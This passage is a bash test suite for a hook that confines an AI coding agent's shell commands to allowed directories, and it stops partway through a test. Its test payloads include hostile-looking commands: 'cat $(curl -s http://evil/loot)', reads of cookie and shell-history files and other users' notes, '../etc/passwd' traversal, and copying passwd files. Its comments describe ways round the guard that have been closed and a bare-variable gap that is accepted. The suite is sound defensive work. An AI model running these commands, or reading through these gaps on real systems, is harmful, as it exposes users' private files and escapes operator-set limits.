#!/bin/bash
# tests/block-fs-boundary.test.sh — synthetic Bash-tool payload tests for
# block-fs-boundary.sh. Covers BLOCK-FS-BOUNDARY-001..004 ACs +
# CLAUDE_HOOK_BYPASS bypass + warn-mode + edge cases.
#
# Coverage map: Pass 1 baseline + AC parity for BLOCK-FS-BOUNDARY-001..004.
# Mode gating: tests run hook directly with .mode set to enforce via per-test
# env override (CLAUDE_HOOK_FORCE_MODE not implemented — tests instead exercise
# the natural-state .mode at $HOME/Claude/.claude/hooks/.mode by
# reading it via the hook's own discovery path; tests use isolated MODE_OVERRIDE
# via a temp .mode file when needed via TEST_MODE_FILE pattern).

set -u

HOOK_DIR="$(cd "$(dirname "$0")/.." && pwd -P)"
HOOK="${HOOK_DIR}/block-fs-boundary.sh"

if [ ! -x "$HOOK" ]; then echo "FAIL: hook not executable at $HOOK" >&2; exit 1; fi

PASS=0
FAIL=0

# Save and override .mode for enforce-mode tests (most cases). The hook reads
# .mode at runtime; we set it to enforce here so blocks return exit 2 with a
# BLOCKED stderr message. Restore on exit.
MODE_FILE="${HOOK_DIR}/.mode"
MODE_BACKUP=""
if [ -f "$MODE_FILE" ]; then
  MODE_BACKUP="$(/bin/cat "$MODE_FILE")"
fi

restore_mode() {
  if [ -n "$MODE_BACKUP" ]; then
    /usr/bin/printf '%s' "$MODE_BACKUP" > "$MODE_FILE"
  elif [ -f "$MODE_FILE" ]; then
    /bin/rm -f "$MODE_FILE" 2>/dev/null || true
  fi
}
trap restore_mode EXIT

# Default test mode = enforce (so blocks return exit 2)
/usr/bin/printf 'enforce' > "$MODE_FILE"

test_case() {
  local name="$1"; local payload="$2"; local expected_exit="$3"; local expected_pattern="${4:-}"
  local env_var="${5:-}"
  local tmp_stderr; tmp_stderr="$(/usr/bin/mktemp)"
  local actual_exit=0
  if [ -n "$env_var" ]; then
    /usr/bin/printf '%s' "$payload" | /usr/bin/env "$env_var" /bin/bash "$HOOK" 2>"$tmp_stderr" >/dev/null || actual_exit="$?"
  else
    /usr/bin/printf '%s' "$payload" | /bin/bash "$HOOK" 2>"$tmp_stderr" >/dev/null || actual_exit="$?"
  fi
  local actual_stderr; actual_stderr="$(/bin/cat "$tmp_stderr")"; /bin/rm -f "$tmp_stderr"
  local ok=1
  [ "$actual_exit" != "$expected_exit" ] && ok=0
  if [ -n "$expected_pattern" ] && ! /usr/bin/printf '%s' "$actual_stderr" | /usr/bin/grep -qE "$expected_pattern"; then ok=0; fi
  if [ "$ok" = 1 ]; then
    /usr/bin/printf 'PASS: %s\n' "$name"; PASS=$((PASS + 1))
  else
    /usr/bin/printf 'FAIL: %s (exit=%s expected=%s)\n  stderr: %s\n' "$name" "$actual_exit" "$expected_exit" "$actual_stderr"
    FAIL=$((FAIL + 1))
  fi
}

# bash_payload <command> [cwd]
bash_payload() {
  local cmd="$1"
  local cwd="${2:-$HOME/Claude/.claude/worktrees/planning}"
  /usr/bin/jq -n --arg cmd "$cmd" --arg cwd "$cwd" \
    '{tool_name: "Bash", tool_input: {command: $cmd}, cwd: $cwd}'
}

echo "================================"
echo "block-fs-boundary.sh tests"
echo "================================"

# ----- HOME isolation: the fixture home (HOME-FIXTURE-01) -----
#
# The arms that pass "$FSB_HOME_ENV" assert that a target spelled from the operator's
# home (`~/...` in the payload, or the home expanded into it) lies OUTSIDE every allowed
# root. That premise holds only while HOME itself lies outside every allowed root, and
# the allowlist admits the shared scratch roots: /tmp and the per-user temp area under
# /var/folders. A caller that points HOME at a `mktemp -d` directory, as the install
# regression's HOME-override step does, puts every such target inside an allowed root;
# the hook then allows it, correctly, and the arm reads an allow. Neither the hook nor
# the arm is wrong: the hook resolves `~` through HOME exactly as the shell that would
# run the command does.
#
# The lever is the git-identity fixture pattern of the install durability suite
# (core/deploy/tests/test_upgrade_config_durability.sh, its GIT_CONFIG_GLOBAL arms): a
# per-invocation env prefix on only the command that reads the HOME-derived input, here
# the hook, pointed at a fixture. The fixture home lies outside every allowed root by
# construction and is never created: the hook classifies a path without requiring it to
# exist. The arms that assert an ALLOW inside a HOME-derived root keep the caller's HOME,
# because the layout helper materialized those allowlist rows from the caller's HOME.
FSB_FIXTURE_HOME="/nonexistent/fs-boundary-fixture-home"
FSB_FIXTURE_HOME_INSIDE="/tmp/fs-boundary-fixture-home"
FSB_HOME_ENV="HOME=${FSB_FIXTURE_HOME}"

# Probe-validity precondition: prove the lever is live, with BOTH arms observed, before
# any assertion depends on it. Sensitivity: under the fixture home a `~` target blocks
# and the message names the fixture path, so the hook resolved `~` through the pinned
# HOME and not the caller's. Specificity: the same payload under a home inside an
# allowed root is allowed, so the verdict follows HOME, which is the dependence the
# pinned arms isolate. Without this, a prefix the hook silently ignored would surface as
# a run of confusing arm failures rather than one named one.
fsb_home_probe() {   # $1 = HOME for the hook -> sets FSB_PROBE_EXIT and FSB_PROBE_ERR
  local fsb_payload; fsb_payload="$(bash_payload 'cat ~/Documents/file.txt')"
  FSB_PROBE_EXIT=0
  FSB_PROBE_ERR="$(/usr/bin/printf '%s' "$fsb_payload" | /usr/bin/env "HOME=$1" /bin/bash "$HOOK" 2>&1 >/dev/null)" || FSB_PROBE_EXIT="$?"
}
fsb_home_probe "$FSB_FIXTURE_HOME"
fsb_out_exit="$FSB_PROBE_EXIT"; fsb_out_err="$FSB_PROBE_ERR"
fsb_home_probe "$FSB_FIXTURE_HOME_INSIDE"
fsb_in_exit="$FSB_PROBE_EXIT"; fsb_in_err="$FSB_PROBE_ERR"
fsb_out_named=0
case "$fsb_out_err" in
  *"${FSB_FIXTURE_HOME}/Documents/file.txt"*) fsb_out_named=1 ;;
esac
if [ "$fsb_out_exit" = 2 ] && [ "$fsb_out_named" = 1 ] && [ "$fsb_in_exit" = 0 ]; then
  /usr/bin/printf 'PASS: HOME-FIXTURE-01 fixture-home isolation live (sensitivity + specificity arms both observed)\n'; PASS=$((PASS + 1))
else
  /usr/bin/printf 'FAIL: HOME-FIXTURE-01 fixture-home isolation NOT live, so the HOME-pinned arms below cannot be trusted\n  outside-root home: exit=%s (expected 2), fixture path named=%s (expected 1)\n  inside-root home: exit=%s (expected 0)\n  stderr (outside): %s\n  stderr (inside): %s\n' \
    "$fsb_out_exit" "$fsb_out_named" "$fsb_in_exit" "$fsb_out_err" "$fsb_in_err"
  FAIL=$((FAIL + 1))
fi

# ----- BLOCK-FS-BOUNDARY-001: file-read verbs outside allowed roots -----

test_case "cat ~/Documents blocks" \
  "$(bash_payload 'cat ~/Documents/file.txt')" 2 "BLOCK-FS-BOUNDARY-001" "$FSB_HOME_ENV"

test_case "cat /Users/otheruser blocks" \
  "$(bash_payload 'cat /Users/otheruser/notes.txt')" 2 "BLOCK-FS-BOUNDARY-001"

# ----- EXT-POS (#5644): command-start position coverage -----
#
# ANCHOR_PREFIX_BASH saw a command start only at line-start or after `;&|`, so the
# IDENTICAL out-of-boundary read allowed when moved behind an ordinary command prefix or
# into a group. Closed by the shared canonicalizer (core/hooks/lib/command-position.awk).
test_case "EXT-POS-F1: sudo cat outside-root blocks (command-prefix word)" \
  "$(bash_payload 'sudo cat /Users/otheruser/notes.txt')" 2 "BLOCK-FS-BOUNDARY-001"

test_case "EXT-POS-F2: brace group cat outside-root blocks (grouping)" \
  "$(bash_payload '{ cat /Users/otheruser/notes.txt; }')" 2 "BLOCK-FS-BOUNDARY-001"

test_case "EXT-POS-F3: do-body cat outside-root blocks (compound keyword)" \
  "$(bash_payload 'for f in a; do cat /Users/otheruser/notes.txt; done')" 2 "BLOCK-FS-BOUNDARY-001"

test_case "EXT-POS-F4: escaped verb cat outside-root blocks" \
  "$(bash_payload '\cat /Users/otheruser/notes.txt')" 2 "BLOCK-FS-BOUNDARY-001"

# FP guard: shell text carried as quoted content is not a command.
test_case "EXT-FP-F1: quoted outside-root path as message content allows" \
  "$(bash_payload 'git commit -m "cat /Users/otheruser/notes.txt was the bug"')" 0

test_case "head ~/Desktop blocks" \
  "$(bash_payload 'head ~/Desktop/foo.log')" 2 "BLOCK-FS-BOUNDARY-001" "$FSB_HOME_ENV"

test_case "tail ~/Library/Mail blocks" \
  "$(bash_payload 'tail ~/Library/Mail/inbox')" 2 "BLOCK-FS-BOUNDARY-001" "$FSB_HOME_ENV"

test_case "base64 ~/Library/Cookies blocks" \
  "$(bash_payload 'base64 ~/Library/Cookies/cookies.db')" 2 "BLOCK-FS-BOUNDARY-001" "$FSB_HOME_ENV"

test_case "xxd /Users/otheruser blocks" \
  "$(bash_payload 'xxd /Users/otheruser/.bash_history')" 2 "BLOCK-FS-BOUNDARY-001"

test_case "less ~/Pictures blocks" \
  "$(bash_payload 'less ~/Pictures/screenshot.png')" 2 "BLOCK-FS-BOUNDARY-001" "$FSB_HOME_ENV"

# ----- BLOCK-FS-BOUNDARY-002: file-write verbs outside allowed roots -----

test_case "cp source outside Claude blocks" \
  "$(bash_payload 'cp ~/Documents/foo /tmp/bar')" 2 "BLOCK-FS-BOUNDARY-002" "$FSB_HOME_ENV"

test_case "cp target outside Claude blocks" \
  "$(bash_payload 'cp /tmp/foo ~/Desktop/bar')" 2 "BLOCK-FS-BOUNDARY-002" "$FSB_HOME_ENV"

test_case "mv source outside Claude blocks" \
  "$(bash_payload 'mv ~/Documents/old.txt /tmp/new.txt')" 2 "BLOCK-FS-BOUNDARY-002" "$FSB_HOME_ENV"

test_case "tee ~/Desktop target blocks" \
  "$(bash_payload 'tee ~/Desktop/test.txt')" 2 "BLOCK-FS-BOUNDARY-002" "$FSB_HOME_ENV"

# The payload carries the home already expanded, as the shell would pass `of=` to dd,
# so the fixture home is spelled into it rather than read from HOME by the hook.
test_case "dd of=~/Desktop target blocks" \
  "$(bash_payload 'dd if=/tmp/foo of='"$FSB_FIXTURE_HOME"'/Desktop/bar.bin')" 2 "BLOCK-FS-BOUNDARY-002" "$FSB_HOME_ENV"

# ----- BLOCK-FS-BOUNDARY-003: unresolvable strict-policy -----

# RE-BASELINED BY #5555 — this arm is kept, not removed, because its subject is exactly
# what Policy P changes. `cat $SECRET_FILE` is a bare parameter expansion: no $(, no
# backtick, no \001 sentinel, no `..`, and no decidable literal prefix. It is now G6 —
# ADMITTED with a -004 advisory record — written at warn and enforce; at .mode=off the
# hook exits before check_verb and nothing is recorded (pinned by MODEOFF-REC-01 below).
#
# This is a REAL surrender of coverage and is the card's documented cost (Stage 5 risk
# RA): `cat "$X"` where $X expands to an out-of-boundary path is admitted where it was
# refused. It is accepted because the refusal could not distinguish that case from the
# 90% of live firings that would have resolved INSIDE an allowed root, and because a
# PreToolUse hook cannot expand $X without executing the command it has not yet approved.
# Every DECIDABLE hostile shape stays refused — see the AC-4/AC-5/AC-6/AC-7/AC-8 arms.
test_case "cat dollar-var → -004 advisory ADMIT (re-baselined by #5555; was -003 block)" \
  "$(bash_payload 'cat $SECRET_FILE')" 0

test_case "cp subshell unresolvable blocks" \
  "$(bash_payload 'cp $(find / -name passwd) /tmp/x')" 2 "BLOCK-FS-BOUNDARY-003"

test_case "tee backtick unresolvable blocks" \
  "$(bash_payload 'tee `echo /etc/hosts`')" 2 "BLOCK-FS-BOUNDARY-003"

# ----- Path-traversal escape (GHSA-9cjm-v22x-4x33 V2) -----
# A literal `..` component escapes an allowed root by prefix-matching BEFORE it
# is collapsed (/tmp/../etc prefix-matches allowed /tmp/ yet resolves to /etc).
# resolve_and_classify now rejects any `..` path-component up front (strict) —
# independent of the python3 normalizer, which previously fell back to the
# un-normalized path when python3 was absent (the second fail-open).
test_case "cat traversal escape blocks (.. token → strict)" \
  "$(bash_payload 'cat /tmp/../etc/passwd')" 2 "BLOCK-FS-BOUNDARY-003"

test_case "tee traversal escape blocks (.. token → strict)" \
  "$(bash_payload 'tee /tmp/aaa/../../../etc/passwd')" 2 "BLOCK-FS-BOUNDARY-003"

# ==========================================================================
# POLICY P (#5555) — BLOCK-FS-BOUNDARY-004 and the guard cascade
# ==========================================================================
# The predicate these arms replace was a CHARACTER test, not a SHAPE test: any `$`
# anywhere in an operand returned "unresolvable" and refused. It collapsed three
# epistemic states — decidably-inside, decidably-outside, genuinely undecidable —
# into one refusal, and 90% of its live firings were reads that would have resolved
# INSIDE an allowed root. The cascade below separates them.
#
# Guard order is load-bearing (refuse-before-decide):
#   G0 $XARGS-STDIN · G1 \001 sentinel · G2 $( / backtick · G3 .. / cwd / normalizer
#   · G5 decidable prefix outside · G4 decidable prefix inside · G6 advisory -004

# ----- AC-2: the card's original class — a stdin reader has no file operand -----
# These already passed before Policy P (extract_target_tokens emits nothing for a
# flags-only segment). They are pinned so a future narrowing cannot silently take
# them away. The must-block twin below is what makes their exit-0 non-vacuous.

test_case "AC-2: pipe into head (no file operand) allowed" \
  "$(bash_payload 'git log --oneline | head -n 20')" 0

# The case LABEL below names the command it pins, so it carries that command's
# text verbatim. GATE 10's T1 content-exemption strips single-quoted spans only,
# so the payload on the second line is exempt automatically while the identical
# text in the double-quoted label reads as a finding — the documented
# double-quoted false-alarm class, resolved by a declared marker rather than by
# renaming the case or re-quoting it away.
# sigpipe-idiom: allow — double-quoted test-case LABEL, a string operand to `test_case`, not a pipeline: no writer, no reader, no pipeline status to invert
test_case "AC-2: ps aux | head -5 allowed" \
  "$(bash_payload 'ps aux | head -5')" 0

test_case "AC-2: producer | tail -n 3 allowed" \
  "$(bash_payload 'some-producer | tail -n 3')" 0

test_case "AC-2 CONTROL (must-block twin): cat outside-root still blocks — proves the hook was armed when the zeros above were read" \
  "$(bash_payload 'cat /Users/otheruser/notes.txt')" 2 "BLOCK-FS-BOUNDARY-001"

# ----- AC-3 (G6): the dominant false-positive class is admitted under -004 -----

test_case "AC-3 (G6): cat \"\$SPOKE_OUT/comment.md\" admitted" \
  "$(bash_payload 'cat "$SPOKE_OUT/comment.md"')" 0

test_case "AC-3 (G6): cat \"\$f\" admitted" \
  "$(bash_payload 'cat "$f"')" 0

test_case "AC-3 (G6): tee \"\$SPOKE_OUT/body.md\" admitted (write verb, same policy)" \
  "$(bash_payload 'tee "$SPOKE_OUT/body.md"')" 0

test_case "AC-3 (G6): cat \"\$HOME/Claude/...\" admitted" \
  "$(bash_payload 'cat "$HOME/Claude/pmo-platform/README.md"')" 0

# AC-3 record control: a SILENT allow fails this criterion. -004 must actually log,
# because the -004 record is what keeps the admitted class measurable at warn/enforce (and
# a later narrowing evidence-backed). Counts `rule` lines in the sandbox warn log —
# the log is pretty-printed JSON, so one record contributes exactly one such line.
WARN_LOG_FILE="${HOOK_DIR}/fs-boundary-warn-log.jsonl"
_adv_before=0
if [ -f "$WARN_LOG_FILE" ]; then
  _adv_before="$(/usr/bin/grep -c 'BLOCK-FS-BOUNDARY-004' "$WARN_LOG_FILE" 2>/dev/null || echo 0)"
fi
/usr/bin/printf '%s' "$(bash_payload 'cat "$ADVISORY_PROBE_A/x.md"')" | /bin/bash "$HOOK" >/dev/null 2>&1 || true
/usr/bin/printf '%s' "$(bash_payload 'cat "$ADVISORY_PROBE_B/y.md"')" | /bin/bash "$HOOK" >/dev/null 2>&1 || true
_adv_after=0
if [ -f "$WARN_LOG_FILE" ]; then
  _adv_after="$(/usr/bin/grep -c 'BLOCK-FS-BOUNDARY-004' "$WARN_LOG_FILE" 2>/dev/null || echo 0)"
fi
_adv_delta=$((_adv_after - _adv_before))
if [ "$_adv_delta" = 2 ]; then
  /usr/bin/printf 'PASS: AC-3 record control: 2 admitted operands emitted exactly 2 BLOCK-FS-BOUNDARY-004 records\n'; PASS=$((PASS + 1))
else
  /usr/bin/printf 'FAIL: AC-3 record control: expected delta 2 BLOCK-FS-BOUNDARY-004 records, got %s (a silent allow fails this criterion)\n' "$_adv_delta"; FAIL=$((FAIL + 1))
fi

# AC-3 mode-independence (INT-3): -004 is NOT warn-mode behaviour. It never blocks at
# any .mode value. Asserted here at ENFORCE — the mode at which a mode-gated rule WOULD
# block — so "it allowed" cannot be explained by the dial. No .mode write is added: the
# suite's default mode is already enforce.
test_case "AC-3 (INT-3): -004 admits at .mode=enforce — mode-independent by construction, not warn-mode behaviour" \
  "$(bash_payload 'cat "$SPOKE_OUT/enforce-probe.md"')" 0

# ----- MODEOFF-REC: the -004 RECORD is mode-scoped, and the corpus must say so (F-12) --
#
# WHY THIS ARM EXISTS. The registry row above it used to read "Admitted and always
# recorded. Mode-independent by construction", and advise_unresolvable's comment said the
# admission "is recorded" with no qualifier. Both overstated the same way. The ADMIT is
# mode-independent — INT-3 directly above proves it at enforce, the mode at which a
# mode-gated rule WOULD block. The RECORD is not: at .mode=off the hook exits at the `off`
# short-circuit above the dependency gate, so check_verb is never called,
# advise_unresolvable is never reached, and NO -004 record is written.
#
# It is material rather than pedantic because AC-1's measurability argument rests on the
# record existing, and the claim was stated in the bypass-mode-readiness corpus — the
# document an operator reads when deciding an enforce flip, whose whole subject is that
# dial. A reader who took "always recorded" literally would read a zero record count on an
# off-mode instance as an empty population rather than as a disabled hook.
#
# This arm holds the DOCUMENT against the HOOK's own verdict in the same run, so prose and
# behaviour cannot drift apart silently. Same shape as NOEXEC-DOC-01 in
# block-destructive.test.sh, and the same reason: a doc claim with no executable arm is a
# claim that decays.
#
# NO PIPELINES ANYWHERE IN THIS BLOCK. The doc classifier and the record counter are each
# one awk pass using index() — literal matching, so no marker needs escaping — and the
# behavioural probe feeds the hook from a FILE rather than from a writer on the other side
# of a pipe. Both are deliberate: a writer piped into a short-circuiting reader is the
# idiom the SIGPIPE-idiom gate matches by name.
MODEOFF_FRAG="$(cd "$(dirname "$0")/../.." && pwd -P)/rules/bypass-mode-readiness/block-fs-boundary.md"
[ -f "$MODEOFF_FRAG" ] || MODEOFF_FRAG="$(cd "$(dirname "$0")/../../.." && pwd -P)/core/rules/bypass-mode-readiness/block-fs-boundary.md"
MODEOFF_INDEX="$(cd "$(dirname "$0")/../.." && pwd -P)/rules/bypass-mode-readiness.md"
[ -f "$MODEOFF_INDEX" ] || MODEOFF_INDEX="$(cd "$(dirname "$0")/../../.." && pwd -P)/core/rules/bypass-mode-readiness.md"
MODEOFF_LOG="${HOOK_DIR}/fs-boundary-warn-log.jsonl"

# MODE-SCOPED requires all three: the retired absolute GONE, the disposition/record split
# stated, and the .mode=off consequence named. Any two without the third is the
# both-ways-at-once state a partial reconcile leaves behind — prose that has been softened
# without being corrected, which is the specific regression this release has flagged
# repeatedly. A vaguer sentence must not pass this classifier.
modeoff_rec_claim() {   # $1 = readiness file -> MODE-SCOPED | STALE-ABSOLUTE | NO-SPLIT | NO-OFF-CLAUSE | DOC-MISSING
  if [ ! -f "$1" ]; then /usr/bin/printf 'DOC-MISSING'; return 0; fi
  /usr/bin/awk '
    index($0, "Admitted and always recorded")                                           { stale = 1 }
    index($0, "The disposition is mode-independent; the record is not")                 { sp = 1 }
    index($0, "the hook exits before the verb check, so no advisory record is written")  { oc = 1 }
    END {
      if (stale == 1) { printf "STALE-ABSOLUTE"; exit }
      if (sp    != 1) { printf "NO-SPLIT";       exit }
      if (oc    != 1) { printf "NO-OFF-CLAUSE";  exit }
      printf "MODE-SCOPED"
    }
  ' "$1"
}

# Counting with awk rather than `grep -c` is deliberate on two counts: grep exits 1 on a
# zero count, and a zero count is precisely the reading this arm must be able to trust.
modeoff_rec_count() {   # -> integer count of -004 records currently in the sandbox warn log
  if [ ! -f "$MODEOFF_LOG" ]; then /usr/bin/printf '0'; return 0; fi
  /usr/bin/awk 'index($0, "BLOCK-FS-BOUNDARY-004") { n++ } END { printf "%d", n + 0 }' "$MODEOFF_LOG"
}

# The behavioural half, taken from the SHIPPED hook in this same run. One G6 payload, one
# mode, measured as a record delta. Restores enforce immediately, like test_off_case above.
modeoff_rec_delta() {   # $1 = .mode value -> record delta for one G6 payload
  local modeoff_before modeoff_after modeoff_pf
  modeoff_before="$(modeoff_rec_count)"
  modeoff_pf="$(/usr/bin/mktemp)"
  /usr/bin/printf '%s' "$(bash_payload 'cat "$MODEOFF_PROBE/x.md"')" > "$modeoff_pf"
  /usr/bin/printf '%s' "$1" > "$MODE_FILE"
  /bin/bash "$HOOK" < "$modeoff_pf" >/dev/null 2>&1 || true
  /usr/bin/printf 'enforce' > "$MODE_FILE"
  /bin/rm -f "$modeoff_pf"
  modeoff_after="$(modeoff_rec_count)"
  /usr/bin/printf '%d' "$((modeoff_after - modeoff_before))"
}

# The enforce delta is this measurement's OWN sensitivity arm. A zero at off proves nothing
# unless the identical probe returns non-zero at a mode where the record is claimed to
# exist — otherwise a broken probe and a correct finding are indistinguishable.
modeoff_off_delta="$(modeoff_rec_delta off)"
modeoff_enf_delta="$(modeoff_rec_delta enforce)"
if [ "$modeoff_off_delta" = 0 ] && [ "$modeoff_enf_delta" = 1 ]; then
  modeoff_behaviour="MODE-SCOPED"
elif [ "$modeoff_off_delta" != 0 ]; then
  modeoff_behaviour="RECORDS-AT-OFF"
else
  modeoff_behaviour="NEVER-RECORDS"
fi

modeoff_frag_claim="$(modeoff_rec_claim "$MODEOFF_FRAG")"
modeoff_index_claim="$(modeoff_rec_claim "$MODEOFF_INDEX")"

if [ "$modeoff_behaviour" = "MODE-SCOPED" ] && [ "$modeoff_frag_claim" = "MODE-SCOPED" ]; then
  /usr/bin/printf 'PASS: MODEOFF-REC-01 readiness SOURCE and hook agree (doc=%s, records off=%s enforce=%s)\n' \
    "$modeoff_frag_claim" "$modeoff_off_delta" "$modeoff_enf_delta"
  PASS=$((PASS + 1))
else
  /usr/bin/printf 'FAIL: MODEOFF-REC-01 readiness SOURCE and hook DISAGREE\n  doc=%s (expected MODE-SCOPED)  behaviour=%s (expected MODE-SCOPED; off delta=%s expected 0, enforce delta=%s expected 1)\n  file=%s\n' \
    "$modeoff_frag_claim" "$modeoff_behaviour" "$modeoff_off_delta" "$modeoff_enf_delta" "$MODEOFF_FRAG"
  FAIL=$((FAIL + 1))
fi

# The GENERATED index is pinned separately rather than assumed. build-hook-registry.py
# --check already proves it matches its source, but that gate is about freshness; this one
# is about the claim, and a reader who lands on the index must not find the retired
# absolute there.
if [ "$modeoff_index_claim" = "MODE-SCOPED" ]; then
  /usr/bin/printf 'PASS: MODEOFF-REC-02 generated registry index carries the same mode-scoped claim\n'
  PASS=$((PASS + 1))
else
  /usr/bin/printf 'FAIL: MODEOFF-REC-02 generated index claim=%s (expected MODE-SCOPED) — regenerate with build-hook-registry.py\n  file=%s\n' \
    "$modeoff_index_claim" "$MODEOFF_INDEX"
  FAIL=$((FAIL + 1))
fi

# RED-BEFORE CONTROLS — ONE PER WAY THE CLAIM CAN GO WRONG. A classifier that cannot report
# anything but MODE-SCOPED proves nothing, so the same predicate is run against three
# mutants of the shipped document. Each arm asserts the mutation is LIVE (the mutant differs
# from the shipped file) AND that the classifier reports the specific code that mutation
# should produce — a merged conjunct, because a sed that matched nothing would otherwise let
# the control pass for the wrong reason.
modeoff_rec_control() {   # $1 = arm id  $2 = expected code  $3 = sed script
  local modeoff_mut modeoff_got
  modeoff_mut="$(/usr/bin/mktemp)"
  /usr/bin/sed "$3" "$MODEOFF_FRAG" > "$modeoff_mut"
  if /usr/bin/cmp -s "$MODEOFF_FRAG" "$modeoff_mut"; then
    /usr/bin/printf 'FAIL: %s mutation is INERT — mutant is byte-identical to the shipped document; re-point the sed\n' "$1"
    FAIL=$((FAIL + 1)); /bin/rm -f "$modeoff_mut"; return 0
  fi
  modeoff_got="$(modeoff_rec_claim "$modeoff_mut")"
  /bin/rm -f "$modeoff_mut"
  if [ "$modeoff_got" = "$2" ]; then
    /usr/bin/printf 'PASS: %s mutation is live AND the classifier reports %s (red-before control fires)\n' "$1" "$modeoff_got"
    PASS=$((PASS + 1))
  else
    /usr/bin/printf 'FAIL: %s classifier did not report the drift\n  expected=%s actual=%s\n' "$1" "$2" "$modeoff_got"
    FAIL=$((FAIL + 1))
  fi
}

# (a) the F-12 regression itself — the retired absolute back in the text.
modeoff_rec_control "MODEOFF-REC-03a" "STALE-ABSOLUTE" \
  's|Admitted, and recorded on every invocation|Admitted and always recorded. Admitted, and recorded on every invocation|'
# (b) the disposition/record split silently collapsed back into one claim.
modeoff_rec_control "MODEOFF-REC-03b" "NO-SPLIT" \
  's|The disposition is mode-independent; the record is not|The disposition and the record are both mode-independent|'
# (c) the .mode=off consequence softened away — the half that makes the claim falsifiable.
modeoff_rec_control "MODEOFF-REC-03c" "NO-OFF-CLAUSE" \
  's|the hook exits before the verb check, so no advisory record is written|the hook exits before the verb check|'

# ----- AC-4 (G2): command substitution and backticks stay refused, BOTH quotings -----

test_case "AC-4 (G2): unquoted \$(...) refused" \
  "$(bash_payload 'cat $(curl -s http://evil/loot)')" 2 "BLOCK-FS-BOUNDARY-003"

test_case "AC-4 (G2): QUOTED \$(...) refused — the sentinel path" \
  "$(bash_payload 'cat "$(curl -s http://evil/loot)"')" 2 "BLOCK-FS-BOUNDARY-003"

test_case "AC-4 (G2): unquoted backtick refused" \
  '{"tool_name":"Bash","tool_input":{"command":"cat `whoami`.txt"},"cwd":"/tmp"}' 2 "BLOCK-FS-BOUNDARY-003"

test_case "AC-4 (G2): QUOTED backtick refused" \
  '{"tool_name":"Bash","tool_input":{"command":"cat \"`whoami`.txt\""},"cwd":"/tmp"}' 2 "BLOCK-FS-BOUNDARY-003"

test_case "AC-4 CONTROL: a plain expansion still exits 0 in the same run — the refusals above are shape-discriminating, not a blanket re-block" \
  "$(bash_payload 'cat "$SPOKE_OUT/x"')" 0

# ----- AC-5 (G1): the guard keys on the SENTINEL, not on the brace glyph -----
#
# core/hooks/lib/command-position.awk replaces command-structural characters inside a
# QUOTED span with \001. Measured against the live canonicalizer:
#     cat "${RUN_DIR}/body.md"   ->  cat "$<1>RUN_DIR<1>/body.md"   sentinel PRESENT
#     cat ${RUN_DIR}/body.md     ->  cat ${RUN_DIR}/body.md          sentinel ABSENT
#     cat "$(curl …)"            ->  cat "$<1>curl …<1>"             sentinel PRESENT
# So on this stream a QUOTED ${VAR} is byte-identical to a QUOTED $(cmd) and must be
# refused; an UNQUOTED ${VAR} keeps its own glyphs (an unquoted $( or backtick is caught
# by G2) and is not refused by G1 — one carrying a parameter-transformation operator
# included, a declared exclusion the XFORM section below pins. RC in the Stage 5 risk register is
# the edit these three arms exist to fail: "simplify" G1 into a brace test and arm 1 or
# arm 2 breaks immediately.
#
# NOTE — DELIBERATE, SURFACED DIVERGENCE FROM THE STAGE 5 AC-5 TEXT. AC-5's parenthetical
# control arm says the unquoted form "also exits 2". That contradicts (a) the same spec's
# implementation note, which defines an expansion span as "$NAME, $1/$@/$#-class, or an
# UNQUOTED ${…}", and (b) AC-5's own stated purpose — if both quoted and unquoted braces
# refused, the guard would be keying on the brace glyph, which that sentence explicitly
# denies. Implemented to the security-correct reading. Measured: this choice moves the
# AC-1 residual by 23/5040 records (8.93% vs 9.38%) — both under the 10% threshold, so
# the threshold does not force the answer and the divergence is a security judgment.

test_case "AC-5 (G1): QUOTED \${...} refused — sentinel-bearing, indistinguishable from \$(...)" \
  "$(bash_payload 'cat "${RUN_DIR}/body.md"')" 2 "BLOCK-FS-BOUNDARY-003"

test_case "AC-5 (G1 discriminator): UNQUOTED \${...} admitted — same brace glyph, no sentinel" \
  "$(bash_payload 'cat ${RUN_DIR}/body.md')" 0

test_case "AC-5 (G1 discriminator): quoted \$NAME with no brace admitted" \
  "$(bash_payload 'cat "$RUN_DIR/body.md"')" 0

# ----- AC-6 (G3): traversal + normalizer self-check unchanged -----

test_case "AC-6 (G3): .. inside a literal span of an expansion-bearing operand refused" \
  "$(bash_payload 'cat "$X/../../../../etc/passwd"')" 2 "BLOCK-FS-BOUNDARY-003"

test_case "AC-6 (G3): bare relative traversal refused" \
  "$(bash_payload 'cat ../../../../etc/passwd')" 2 "BLOCK-FS-BOUNDARY-003"

test_case "AC-6 CONTROL: an in-root literal read still exits 0" \
  "$(bash_payload 'cat /tmp/ok.txt')" 0

# ----- AC-7 (G4/G5): the decidable-prefix split -----
# G5's live count in the frozen population is 1, so this AC is graded almost entirely on
# synthetic arms — which is the point of asserting it. G5 refuses under -001/-002, NOT
# -003, and the message must identify the resolved path as a PREFIX: telling an operator
# a path resolved when only its prefix did is the failure mode that wording prevents.

test_case "AC-7 (G4): decidable literal prefix INSIDE an allowed root → allowed" \
  "$(bash_payload 'cat '"$HOME"'/Claude/$P/f.txt')" 0

test_case "AC-7 (G5): decidable literal prefix OUTSIDE all roots → -001, not -003" \
  "$(bash_payload 'cat /etc/$X')" 2 "BLOCK-FS-BOUNDARY-001"

test_case "AC-7 (G5): other-user home prefix → -001, not -003" \
  "$(bash_payload 'cat /Users/otheruser/$X/notes.txt')" 2 "BLOCK-FS-BOUNDARY-001"

test_case "AC-7 (G5): the -001 message identifies the resolved path as a PREFIX" \
  "$(bash_payload 'cat /etc/$X')" 2 "decidable literal prefix"

# ----- AC-8 (G0): the xargs carve-out -----
# The canonicalizer routes an xargs denial THROUGH the unresolvable branch, emitting the
# literal token `$XARGS-STDIN` (verified live: `find . -name "*.md" | xargs cat` ->
# `find . -name "*.md" | xargs ; cat $XARGS-STDIN`). A naive "leading expansion → allow"
# rule would parse that as $XARGS + literal "-STDIN", find an empty prefix, and ADMIT it —
# silently disabling the denial with no other arm noticing. G0 is ordered ahead of the
# $NAME parser for exactly this reason, and this arm is what proves the ordering holds.

test_case "AC-8 (G0): xargs-fed verb refused — the stdin sentinel is not a parameter expansion" \
  "$(bash_payload 'find . -name "*.md" | xargs cat')" 2 "BLOCK-FS-BOUNDARY-003"

test_case "AC-8 CONTROL: the pipe itself is not what is refused" \
  "$(bash_payload 'find . -name "*.md" | head -5')" 0

# ----- D-3: sentinel-safe message rendering -----
# The 286 sentinel-bearing operands previously emitted a raw \001 control byte to the
# operator, displaying as a corrupted path. The message now renders a readable marker.

test_case "D-3: sentinel rendered readably in the -003 message (no raw control byte)" \
